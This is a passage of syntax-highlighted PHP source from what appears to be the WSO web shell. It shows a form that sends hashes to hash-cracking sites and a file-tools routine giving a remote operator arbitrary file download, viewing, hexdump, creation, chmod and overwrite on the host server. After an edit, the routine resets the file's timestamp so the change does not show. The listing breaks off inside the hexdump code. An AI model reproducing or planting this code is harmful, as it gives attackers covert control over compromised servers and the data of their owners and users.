<span class="lineno"> 650</span> <span class="s2">          &lt;input type=&#39;text&#39; name=&#39;hash&#39; style=&#39;width:200px;&#39;&gt;&lt;br&gt;</span>
<span class="lineno"> 651</span> <span class="s2">          &lt;input type=&#39;button&#39; value=&#39;hashcrack.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.hashcrack.com/index.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;</span>
<span class="lineno"> 652</span> <span class="s2">          &lt;input type=&#39;button&#39; value=&#39;milw0rm.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.milw0rm.com/cracker/search.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;</span>
<span class="lineno"> 653</span> <span class="s2">          &lt;input type=&#39;button&#39; value=&#39;hashcracking.info&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;https://hashcracking.info/index.php&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;</span>
<span class="lineno"> 654</span> <span class="s2">          &lt;input type=&#39;button&#39; value=&#39;md5.rednoize.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://md5.rednoize.com/?q=&#39;+document.hf.hash.value+&#39;&amp;s=md5&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;</span>
<span class="lineno"> 655</span> <span class="s2">          &lt;input type=&#39;button&#39; value=&#39;md5decrypter.com&#39; onclick=</span><span class="se">\&quot;</span><span class="s2">document.hf.action=&#39;http://www.md5decrypter.com/&#39;;document.hf.submit()</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br&gt;</span>
<span class="lineno"> 656</span> <span class="s2">      &lt;/form&gt;&lt;/div&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 657</span>                                                 <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 658</span>                                             <span class="p">}</span>
<span class="lineno"> 659</span>                                             <span class="k">function</span> <span class="nf">actionFilesTools</span><span class="p">()</span> <span class="p">{</span>
<span class="lineno"> 660</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 661</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;download&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 662</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 663</span>                                                         <span class="nb">ob_start</span><span class="p">(</span><span class="s2">&quot;ob_gzhandler&quot;</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
<span class="lineno"> 664</span>                                                         <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Disposition: attachment; filename=&quot;</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
<span class="lineno"> 665</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mime_content_type&quot;</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 666</span>                                                             <span class="nv">$type</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 667</span>                                                             <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: &quot;</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">);</span>
<span class="lineno"> 668</span>                                                         <span class="p">}</span> <span class="k">else</span> <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: application/octet-stream&quot;</span><span class="p">);</span>
<span class="lineno"> 669</span>                                                         <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno"> 670</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 671</span>                                                             <span class="k">while</span> <span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
<span class="lineno"> 672</span>                                                             <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 673</span>                                                         <span class="p">}</span>
<span class="lineno"> 674</span>                                                     <span class="p">}</span>
<span class="lineno"> 675</span>                                                     <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 676</span>                                                 <span class="p">}</span>
<span class="lineno"> 677</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mkfile&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 678</span>                                                     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 679</span>                                                         <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
<span class="lineno"> 680</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 681</span>                                                             <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;edit&quot;</span><span class="p">;</span>
<span class="lineno"> 682</span>                                                             <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 683</span>                                                         <span class="p">}</span>
<span class="lineno"> 684</span>                                                     <span class="p">}</span>
<span class="lineno"> 685</span>                                                 <span class="p">}</span>
<span class="lineno"> 686</span>                                                 <span class="nx">wsoHeader</span><span class="p">();</span>
<span class="lineno"> 687</span>                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;h1&gt;File tools&lt;/h1&gt;&lt;div class=content&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 688</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 689</span>                                                     <span class="k">echo</span> <span class="s1">&#39;File not exists&#39;</span><span class="p">;</span>
<span class="lineno"> 690</span>                                                     <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="lineno"> 691</span>                                                     <span class="k">return</span><span class="p">;</span>
<span class="lineno"> 692</span>                                                 <span class="p">}</span>
<span class="lineno"> 693</span>                                                 <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
<span class="lineno"> 694</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 695</span>                                                     <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 696</span>                                                     <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 697</span>                                                 <span class="p">}</span> <span class="k">else</span> <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
<span class="lineno"> 698</span>                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Name:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s1">&#39; &lt;span&gt;Size:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nx">wsoViewSize</span><span class="p">(</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="o">:</span> <span class="s1">&#39;-&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; &lt;span&gt;Permission:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; &lt;span&gt;Owner/Group:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 699</span>                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;span&gt;Create time:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="nb">filectime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s1">&#39; &lt;span&gt;Access time:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="nb">fileatime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s1">&#39; &lt;span&gt;Modify time:&lt;/span&gt; &#39;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 700</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;view&#39;</span><span class="p">;</span>
<span class="lineno"> 701</span>                                                 <span class="k">if</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;View&#39;</span><span class="p">,</span> <span class="s1">&#39;Highlight&#39;</span><span class="p">,</span> <span class="s1">&#39;Download&#39;</span><span class="p">,</span> <span class="s1">&#39;Hexdump&#39;</span><span class="p">,</span> <span class="s1">&#39;Edit&#39;</span><span class="p">,</span> <span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
<span class="lineno"> 702</span>                                                 <span class="k">else</span> <span class="nv">$m</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;Chmod&#39;</span><span class="p">,</span> <span class="s1">&#39;Rename&#39;</span><span class="p">,</span> <span class="s1">&#39;Touch&#39;</span><span class="p">);</span>
<span class="lineno"> 703</span>                                                 <span class="k">foreach</span> <span class="p">(</span><span class="nv">$m</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="k">echo</span> <span class="s1">&#39;&lt;a href=# onclick=&quot;g(null,null,null,\&#39;&#39;</span> <span class="o">.</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;\&#39;)&quot;&gt;&#39;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">==</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;&lt;b&gt;[ &#39;</span> <span class="o">.</span> <span class="nv">$v</span> <span class="o">.</span> <span class="s1">&#39; ]&lt;/b&gt;&#39;</span> <span class="o">:</span> <span class="nv">$v</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/a&gt; &#39;</span><span class="p">;</span>
<span class="lineno"> 704</span>                                                 <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 705</span>                                                 <span class="k">switch</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="p">{</span>
<span class="lineno"> 706</span>                                                     <span class="k">case</span> <span class="s1">&#39;view&#39;</span><span class="o">:</span>
<span class="lineno"> 707</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;pre class=ml1&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 708</span>                                                         <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno"> 709</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 710</span>                                                             <span class="k">while</span> <span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
<span class="lineno"> 711</span>                                                             <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 712</span>                                                         <span class="p">}</span>
<span class="lineno"> 713</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 714</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 715</span>                                                     <span class="k">case</span> <span class="s1">&#39;highlight&#39;</span><span class="o">:</span>
<span class="lineno"> 716</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 717</span>                                                             <span class="k">echo</span> <span class="s1">&#39;&lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 718</span>                                                             <span class="nv">$code</span> <span class="o">=</span> <span class="o">@</span><span class="nb">highlight_file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="k">true</span><span class="p">);</span>
<span class="lineno"> 719</span>                                                             <span class="k">echo</span> <span class="nb">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;&lt;span &#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;/span&gt;&#39;</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&lt;font &#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">),</span> <span class="nv">$code</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 720</span>                                                         <span class="p">}</span>
<span class="lineno"> 721</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 722</span>                                                     <span class="k">case</span> <span class="s1">&#39;chmod&#39;</span><span class="o">:</span>
<span class="lineno"> 723</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 724</span>                                                             <span class="nv">$perms</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 725</span>                                                             <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span><span class="o">--</span><span class="nv">$i</span><span class="p">)</span> <span class="nv">$perms</span><span class="o">+=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">][</span><span class="nv">$i</span><span class="p">]</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">])</span> <span class="o">-</span> <span class="nv">$i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">));</span>
<span class="lineno"> 726</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$perms</span><span class="p">))</span> <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 727</span>                                                         <span class="p">}</span>
<span class="lineno"> 728</span>                                                         <span class="nb">clearstatcache</span><span class="p">();</span>
<span class="lineno"> 729</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;script&gt;p3_=&quot;&quot;;&lt;/script&gt;&lt;form onsubmit=&quot;g(null,null,null,null,this.chmod.value);return false;&quot;&gt;&lt;input type=text name=chmod value=&quot;&#39;</span> <span class="o">.</span> <span class="nb">substr</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%o&#39;</span><span class="p">,</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])),</span> <span class="o">-</span><span class="mi">4</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 730</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 731</span>                                                     <span class="k">case</span> <span class="s1">&#39;edit&#39;</span><span class="o">:</span>
<span class="lineno"> 732</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 733</span>                                                             <span class="k">echo</span> <span class="s1">&#39;File isn\&#39;t writeable&#39;</span><span class="p">;</span>
<span class="lineno"> 734</span>                                                             <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 735</span>                                                         <span class="p">}</span>
<span class="lineno"> 736</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 737</span>                                                             <span class="nv">$time</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 738</span>                                                             <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span> <span class="mi">1</span><span class="p">);</span>
<span class="lineno"> 739</span>                                                             <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno"> 740</span>                                                             <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 741</span>                                                                 <span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">]);</span>
<span class="lineno"> 742</span>                                                                 <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 743</span>                                                                 <span class="k">echo</span> <span class="s1">&#39;Saved!&lt;br&gt;&lt;script&gt;p3_=&quot;&quot;;&lt;/script&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 744</span>                                                                 <span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$time</span><span class="p">,</span> <span class="nv">$time</span><span class="p">);</span>
<span class="lineno"> 745</span>                                                             <span class="p">}</span>
<span class="lineno"> 746</span>                                                         <span class="p">}</span>
<span class="lineno"> 747</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;form onsubmit=&quot;g(null,null,null,null,\&#39;1\&#39;+this.text.value);return false;&quot;&gt;&lt;textarea name=text class=bigarea&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 748</span>                                                         <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="lineno"> 749</span>                                                         <span class="k">if</span> <span class="p">(</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 750</span>                                                             <span class="k">while</span> <span class="p">(</span><span class="o">!@</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
<span class="lineno"> 751</span>                                                             <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
<span class="lineno"> 752</span>                                                         <span class="p">}</span>
<span class="lineno"> 753</span>                                                         <span class="k">echo</span> <span class="s1">&#39;&lt;/textarea&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 754</span>                                                         <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 755</span>                                                     <span class="k">case</span> <span class="s1">&#39;hexdump&#39;</span><span class="o">:</span>
<span class="lineno"> 756</span>                                                         <span class="nv">$c</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]);</span>
<span class="lineno"> 757</span>                                                         <span class="nv">$n</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno"> 758</span>                                                         <span class="nv">$h</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;00000000&lt;br&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
<span class="lineno"> 759</span>                                                         <span class="nv">$len</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
<span class="lineno"> 760</span>                                                         <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len</span><span class="p">;</span><span class="o">++</span><span class="nv">$i</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 761</span>                                                             <span class="nv">$h</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%02X&#39;</span><span class="p">,</span> <span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="o">.</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
<span class="lineno"> 762</span>                                                             <span class="k">switch</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$c</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno"> 763</span>                                                                 <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
<span class="lineno"> 764</span>                                                                     <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
<span class="lineno"> 765</span>                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 766</span>                                                                 <span class="k">case</span> <span class="mi">9</span><span class="o">:</span>
<span class="lineno"> 767</span>                                                                     <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
<span class="lineno"> 768</span>                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 769</span>                                                                 <span class="k">case</span> <span class="mi">10</span><span class="o">:</span>
<span class="lineno"> 770</span>                                                                     <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
<span class="lineno"> 771</span>                                                                 <span class="k">break</span><span class="p">;</span>
<span class="lineno"> 772</span>                                                                 <span class="k">case</span> <span class="mi">13</span><span class="o">:</span>
<span class="lineno"> 773</span>                                                                     <span class="nv">$h</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.=</span> <span class="s1">&#39; &#39;</span><span class="p">;</span>
<span class="lineno"> 774</span>                                                                 <span class="k">break</span><span class="p">;</span>
